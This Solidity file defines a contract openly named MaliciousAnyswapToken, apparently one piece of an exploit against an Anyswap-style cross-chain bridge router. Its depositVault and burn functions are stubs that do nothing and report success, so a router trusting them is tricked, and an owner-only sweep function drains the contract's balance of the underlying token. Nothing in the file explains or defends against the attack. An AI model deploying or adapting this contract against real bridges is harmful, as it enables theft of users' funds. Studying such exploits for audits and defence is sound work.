pragma solidity ^0.8.20;
interface IWethLike { function transfer(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); }
contract MaliciousAnyswapToken {
    address public immutable underlying;
    address public immutable owner;
    constructor(address underlying_, address owner_) { underlying = underlying_; owner = owner_; }
    function depositVault(uint256 amount, address) external pure returns (uint256) { return amount; }
    function burn(address, uint256) external pure returns (bool) { return true; }
    function sweep(address to) external { require(msg.sender == owner, "owner"); IWethLike(underlying).transfer(to, IWethLike(underlying).balanceOf(address(this))); }
}
